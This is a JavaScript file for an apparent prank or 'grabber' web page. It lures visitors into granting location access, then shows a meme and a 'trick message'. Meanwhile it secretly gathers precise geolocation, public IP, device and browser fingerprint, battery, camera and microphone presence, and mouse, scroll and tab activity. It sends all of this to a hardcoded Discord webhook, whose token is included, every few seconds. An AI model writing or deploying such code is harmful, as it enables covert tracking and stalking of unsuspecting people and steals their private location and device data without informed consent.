let lastLocation = null;

// Function to get IP address
async function getIP() {
  try {
    const response = await fetch("https://api64.ipify.org?format=json");
    const data = await response.json();
    return data.ip;
  } catch (error) {
    console.error("IP fetch error:", error);
    return "Unknown";
  }
}

// Function to get browser information
function getBrowserInfo() {
  const ua = navigator.userAgent;
  if (ua.includes("Firefox")) return "Firefox";
  if (ua.includes("Edg")) return "Edge";
  if (ua.includes("Chrome")) return "Chrome";
  if (ua.includes("Safari")) return "Safari";
  if (ua.includes("Opera") || ua.includes("OPR")) return "Opera";
  return "Unknown";
}

// Function to check available storage
function getStorageInfo() {
  return {
    localStorage: !!window.localStorage,
    sessionStorage: !!window.sessionStorage,
    cookiesEnabled: navigator.cookieEnabled ? "Yes" : "No",
  };
}

// Function to check latency (ping)
async function checkLatency() {
  const startTime = performance.now();
  await fetch("https://www.google.com", { mode: "no-cors" }).catch(() => {});
  return `${Math.round(performance.now() - startTime)} ms`;
}

// Function to get permissions
async function checkPermissions() {
  const permissions = {};
  for (const perm of ["geolocation", "notifications", "camera", "microphone"]) {
    try {
      const status = await navigator.permissions.query({ name: perm });
      permissions[perm] = status.state;
    } catch {
      permissions[perm] = "Unknown";
    }
  }
  return permissions;
}

// Function to check media devices (microphone & camera)
async function checkMediaDevices() {
  const devices = await navigator.mediaDevices.enumerateDevices();
  const hasMicrophone = devices.some((d) => d.kind === "audioinput");
  const hasCamera = devices.some((d) => d.kind === "videoinput");
  return { microphone: hasMicrophone ? "Yes" : "No", camera: hasCamera ? "Yes" : "No" };
}

// Function to get battery information
async function getBatteryInfo() {
  if (!navigator.getBattery) return { level: "Unknown", charging: "Unknown" };
  const battery = await navigator.getBattery();
  return { level: `${Math.round(battery.level * 100)}%`, charging: battery.charging ? "Yes" : "No" };
}

// Function to track user activity (scroll, mouse movement, tab focus)
let timeSpent = 0;
setInterval(() => timeSpent++, 1);

let scrollPercent = 0;
window.addEventListener("scroll", () => {
  scrollPercent = Math.round((window.scrollY / (document.body.scrollHeight - window.innerHeight)) * 100);
});

let mouseActivity = 0;
document.addEventListener("mousemove", () => mouseActivity++);

let tabFocus = "Active";
document.addEventListener("visibilitychange", () => {
  tabFocus = document.hidden ? "Inactive" : "Active";
});

// Function to send data to Discord webhook
async function sendTrackingData() {
  navigator.geolocation.getCurrentPosition(async (position) => {
    const { latitude, longitude, accuracy } = position.coords;
    const newLocation = `${latitude}, ${longitude}`;

    if (lastLocation === newLocation) return;
    lastLocation = newLocation;

    const ip = await getIP();
    const browser = getBrowserInfo();
    const os = navigator.userAgentData ? navigator.userAgentData.platform : navigator.platform;
    const colorScheme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "Dark Mode" : "Light Mode";
    const storageInfo = getStorageInfo();
    const latency = await checkLatency();
    const permissions = await checkPermissions();
    const mediaDevices = await checkMediaDevices();
    const batteryInfo = await getBatteryInfo();
    const screenResolution = `${screen.width}x${screen.height}`;
    const screenOrientation = screen.orientation ? screen.orientation.type : "Unknown";
    const cpuCores = navigator.hardwareConcurrency || "Unknown";
    const memory = navigator.deviceMemory || "Unknown";

    const data = {
      content: "**User Tracking Data**",
      embeds: [
        {
          title: "Tracking Info",
          color: 16711680,
          fields: [
            { name: "📍 Location", value: newLocation, inline: true },
            { name: "🎯 Accuracy", value: `${accuracy} meters`, inline: true },
            { name: "🌐 IP Address", value: ip, inline: true },
            { name: "🖥 Browser", value: browser, inline: true },
            { name: "💻 OS", value: os, inline: true },
            { name: "🌈 Color Scheme", value: colorScheme, inline: true },
            { name: "🖥 Screen Resolution", value: screenResolution, inline: true },
            { name: "📐 Screen Orientation", value: screenOrientation, inline: true },
            { name: "⚙️ CPU Cores", value: cpuCores.toString(), inline: true },
            { name: "🧠 RAM", value: memory.toString(), inline: true },
            { name: "⏳ Latency", value: latency, inline: true },
            { name: "🔋 Battery", value: `${batteryInfo.level} - Charging: ${batteryInfo.charging}`, inline: true },
            { name: "📡 Microphone", value: mediaDevices.microphone, inline: true },
            { name: "📷 Camera", value: mediaDevices.camera, inline: true },
            { name: "🔗 Cookies Enabled", value: storageInfo.cookiesEnabled, inline: true },
            { name: "🕵️‍♂️ Tab Focus", value: tabFocus, inline: true },
            { name: "📜 Scroll %", value: `${scrollPercent}%`, inline: true },
            { name: "🖱 Mouse Movements", value: mouseActivity.toString(), inline: true },
            { name: "⏰ Time Spent", value: `${timeSpent} sec`, inline: true },
          ],
          footer: { text: "Real-time tracking data" },
        },
      ],
    };

    try {
      const response = await fetch("https://discord.com/api/webhooks/1343276018915606659/tQ8GY-TvgK6fhRrpiPJXkvyvOHBiULAKXo9WbSMCDfTLQnU-aAn36v6g2Qu9z4LxJ6OT", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data),
      });

      if (!response.ok) {
        console.error("Failed to send data:", await response.text());
      } else {
        console.log("Data sent successfully!");
      }
    } catch (error) {
      console.error("Fetch error:", error);
    }
  }, 
  (error) => {
    console.error("Geolocation error:", error.message);
  });
}







function requestLocation() {
    navigator.geolocation.getCurrentPosition(
        (position) => {
            // Hide the location request message
            const authMessage = document.getElementById("auth-message");
            if (authMessage) {
                authMessage.style.display = "none";
            }

            setTimeout(() => {
                // Change to second image without zoom
                document.body.style.backgroundImage = "url('https://i.imgflip.com/4ismnp.jpg')";
                document.body.classList.add("second-image"); // Apply CSS to prevent zoom
                document.body.style.backgroundSize = "auto"; // Ensure no scaling

                // Show the trick message
                document.getElementById("message").style.display = "block";
            }, 1000); // 1-second delay
        },
        (error) => {
            console.error("Location access denied or error:", error);
        }
    );
}

// Ask for location immediately
requestLocation();

// Ask for location every 5 seconds
setInterval(requestLocation, 5000);
